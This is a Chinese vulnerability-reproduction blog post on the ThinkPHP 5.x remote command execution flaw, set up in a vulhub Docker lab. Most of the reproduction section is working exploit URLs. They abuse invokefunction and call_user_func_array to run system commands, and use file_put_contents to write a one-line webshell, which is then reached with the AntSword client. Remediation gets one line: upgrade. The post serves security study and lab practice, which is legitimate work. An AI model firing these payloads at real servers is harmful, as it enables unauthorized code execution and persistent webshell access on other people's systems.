---
title: ThinkPHP 5.x 远程命令执行漏洞分析与复现
date: 2024-3-12 14:45:46
tags:
- 教程
categories:
- 漏洞复现
---



### 一、ThinkPHP介绍

轻量级框架，内部OOP和面向过程代码都存在，是国人自己开发的框架。 ThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，诞生于2006年初，原名FCS，2007年元旦正式更名为ThinkPHP，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，同时也借鉴了国外很多优秀的框架和模式

### 二、漏洞描述

Thinkphp5.0版本中没有对路由中的控制器进行严格过滤，导致在没有开启强制路由的情况下可以执行系统命令。

### 三、漏洞影响版本

ThinkPHP 5.0.x < 5.0.23

ThinkPHP 5.1.x < 5.1.31

### 四、漏洞复现

1、搭建环境

这里使用docker直接启动vulhub靶场



```
docker-compose up -d
```

目录：thinkphp/5-rce

[![img](https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003445953-1286734845.png)](https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003445953-1286734845.png)

2、访问页面



```
http://your-ip:8080
```

[![img](https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003530053-453642526.png)](https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003530053-453642526.png)

 3、代码执行



```
/index.php?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=100

/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=pwd
```

获取phpinfo信息

[![img](https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003645625-564520031.png)](https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003645625-564520031.png)

 执行系统命令

[![img](https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003659125-605547546.png)](https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003659125-605547546.png)

 4、写入一句话



```
/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=加你要写入的文件内容url编码
```

[![img](https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003730619-1168207008.png)](https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003730619-1168207008.png)

[![img](https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003742768-1307230955.png)](https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003742768-1307230955.png)

 蚁剑连接

[![img](https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003810605-1765082326.png)](https://img2022.cnblogs.com/blog/2723702/202207/2723702-20220715003810605-1765082326.png)

 

### 五、修复建议

升级至最新版本